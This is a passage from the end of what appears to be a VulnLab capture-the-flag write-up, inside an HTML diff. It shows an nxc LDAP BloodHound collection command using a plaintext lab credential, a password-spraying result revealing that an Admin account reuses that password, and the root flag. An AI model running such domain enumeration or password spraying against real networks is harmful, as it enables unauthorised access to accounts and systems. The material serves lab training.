+</span></span><span class="line"><span class="cl">nxc ldap 10.10.202.37 -u Rhys.Garner -p knh1gJ8Xmeq+uP --bloodhound --collection All -ns 10.10.202.37</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Password spraying :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">Admin --&gt; dom_rgarner : knh1gJ8Xmeq+uP</span></span></code></pre></div>
+  </figure>
+</div>
+<p>Root : VL{050ec757b24206dec5731c0f7c183d17}</p>
+
+			<div class="page-footer-meta d-flex flex-column flex-md-row justify-content-between">
+				</div>
+			<div class="page-nav d-flex flex-column flex-sm-row">
+	
+	<div class="card w-100">
+			<div class="card-body d-flex">
+				<div class="d-flex flex-column justify-content-center">
+					<svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-left" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+						<path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+						<path d="M5 12l14 0"></path>
+						<path d="M5 12l6 6"></path>
+						<path d="M5 12l6 -6"></path>
+				 	</svg>
+				</div>
+				<div class="d-flex flex-column">
+					<div class="text-body-secondary">Prev</div>
+					<a href="/notes/web/race-conditon/" class="stretched-link text-reset text-decoration-none">Race Conditon</a>
+				</div>
+			</div>
+		</div>
+	<div class="m-2"></div>
+	<div class="card text-end w-100">
+			<div class="card-body d-flex justify-content-end">
+				<div class="d-flex flex-column">
+					<div class="text-body-secondary">Next</div>
+					<a href="/notes/lab/vulnlab/retro/" class="stretched-link text-reset text-decoration-none">Retro</a>
+				</div>
+				<div class="d-flex flex-column justify-content-center">
+					<svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-right" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+						<path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+						<path d="M5 12l14 0"></path>
+						<path d="M13 18l6 -6"></path>
+						<path d="M13 6l6 6"></path>
+					</svg>
+				</div>
+			</div>
+		</div>
+	</div>
+
+			
+		</main>
+		
+	</div>
+
+      
+      </div>
+    </div>
+    
+    
+    <footer class="footer text-muted">
+  <div class="container-lg">
+    <div class="row">
+      <div class="col-lg-8 text-center text-lg-start">
+        <ul class="list-inline">
+          <li class="list-inline-item"><a class="text-muted" href="/privacy/">Privacy Policy</a></li>
+        </ul>
+      </div>
+      <div class="col-lg-8 text-center text-lg-end">
+        <ul class="list-inline">
+          <li class="list-inline-item">Brought to you by <a class="text-muted" href="https://thulite.io/">Thulite</a></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</footer>
+
+    
+
+<script async
+  src="/js/app.249127ac97fccea7237e5990340629c63da5a555a7c4a120cf11a5113ea5e96e.js"
+  integrity="sha256-JJEnrJf8zqcjflmQNAYpxj2lpVWnxKEgzxGlET6l6W4=">
+</script>
+
+
+
+
+
+<script async
+  src="/js/flexsearch.be33aab3067e96554f261851c25a593228b91154cd28ff5c7f8d52b2e7f306d2.js"
+  integrity="sha256-vjOqswZ&#43;llVPJhhRwlpZMii5EVTNKP9cf41SsufzBtI=">
+</script>
+<script async
+  src="/js/search-modal.97d606e77f08deeb37876860d99c8f6813ef29263e73b6435c252de6be98d55e.js"
+  integrity="sha256-l9YG538I3us3h2hg2ZyPaBPvKSY&#43;c7ZDXCUt5r6Y1V4=">
+</script>
+
+    
+  </body>
+</html>
